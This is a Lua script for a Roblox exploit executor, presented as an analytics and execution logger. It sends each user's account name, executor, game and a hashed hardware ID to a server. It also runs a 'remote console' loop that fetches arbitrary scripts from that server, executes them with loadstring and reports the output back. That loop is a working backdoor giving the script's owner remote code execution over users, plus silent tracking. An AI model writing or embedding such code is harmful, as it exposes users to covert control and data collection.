--[[
    BlackKing Analytics - execution logger + remote console component.
    Sends execution data to the localhost server (/api/send) and
    polls /api/poll for owner commands to run inside the executor.
    The server handles the discord webhook - the webhook URL never leaves the server.
    V4.5
]]

local HttpRequest = request or (syn and syn.request) or http_request
local IdentifyExecutor = identifyexecutor or (getgenv() and getgenv().identifyexecutor)

local Charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

local function GenerateHashedId()
    local id = game:GetService("RbxAnalyticsService"):GetClientId()
    local hash = 0
    for i = 1, #id do
        hash = (hash * 31 + id:byte(i)) % 4294967296
    end

    local result = {}
    for i = 1, 45 do
        hash = (hash * 1664525 + 1013904223) % 4294967296
        result[i] = Charset:sub((hash % #Charset) + 1, (hash % #Charset) + 1)
    end
    return table.concat(result)
end

local MyHashedId = GenerateHashedId()
local MyAccount = (game:GetService("Players").LocalPlayer and game:GetService("Players").LocalPlayer.Name) or "Unknown"

local Services = setmetatable({}, {
    __index = function(self, Name)
        return game:GetService(Name)
    end
})

local function PostJson(Url, Data)
    if not HttpRequest then
        return
    end
    pcall(function()
        HttpRequest({
            Url = Url,
            Method = "POST",
            Headers = {
                ["content-type"] = "application/json"
            },
            Body = Services.HttpService:JSONEncode(Data)
        })
    end)
end

-- Execution logger
task.spawn(function()
    pcall(function()
        if not HttpRequest then
            return
        end

        local Deadline = tick() + 10
        while not (getgenv().BlackKing and getgenv().BlackKing.TotalExecutions) do
            if tick() > Deadline then
                break
            end
            task.wait(0.1)
        end

        local Player = Services.Players.LocalPlayer
        if not Player then
            return
        end

        local ProductInfo = Services.MarketplaceService:GetProductInfo(game.PlaceId)
        local GameName = ProductInfo and ProductInfo.Name or tostring(game.PlaceId)

        local ApiData = {
            Account = Player.Name,
            Executor = tostring(IdentifyExecutor and IdentifyExecutor() or "Unknown"),
            Executions = tonumber(getgenv().BlackKing.TotalExecutions) or 0,
            GameName = GameName,
            PlaceId = tostring(game.PlaceId),
            HWID = MyHashedId
        }

        task.wait(1)

        PostJson("http://localhost:10577/api/send", ApiData)
    end)
end)

-- Remote console (polls for owner commands and runs them)
task.spawn(function()
    pcall(function()
        if not HttpRequest then
            return
        end

        local PollUrl = "http://localhost:10577/api/poll?hwid=" .. MyHashedId .. "&account=" .. MyAccount
        task.wait(3)

        while true do
            task.wait(1)

            local Ok, Response = pcall(function()
                return HttpRequest({
                    Url = PollUrl,
                    Method = "GET",
                    Headers = {
                        ["content-type"] = "application/json"
                    }
                })
            end)

            if Ok and Response and Response.StatusCode == 200 then
                local OkParse, Decoded = pcall(function()
                    return Services.HttpService:JSONDecode(Response.Body)
                end)

                if OkParse and Decoded and type(Decoded.ID) == "number" and type(Decoded.Script) == "string" and Decoded.Script:len() > 0 then
                    local Output = {}
                    local Genv = getgenv() or (getfenv and getfenv(0)) or _G
                    local OldPrint = Genv.print

                    Genv.print = function(...)
                        local Parts = {}
                        for i = 1, select("#", ...) do
                            Parts[i] = tostring(select(i, ...))
                        end
                        table.insert(Output, table.concat(Parts, "    "))
                        if OldPrint then
                            return OldPrint(...)
                        end
                    end

                    local Success = false
                    local ErrorMessage = nil

                    local Loaded, CompileErr = loadstring(Decoded.Script)
                    if not Loaded then
                        ErrorMessage = tostring(CompileErr)
                    else
                        local OkRun, RunErr = pcall(Loaded)
                        Success = OkRun
                        if not OkRun then
                            ErrorMessage = tostring(RunErr)
                        end
                    end

                    if Genv then
                        Genv.print = OldPrint
                    end

                    PostJson("http://localhost:10577/api/result", {
                        ID = Decoded.ID,
                        HWID = MyHashedId,
                        Account = MyAccount,
                        Success = not not Success,
                        Output = (ErrorMessage or table.concat(Output, "\n"))
                    })
                end
            end
        end
    end)
end)
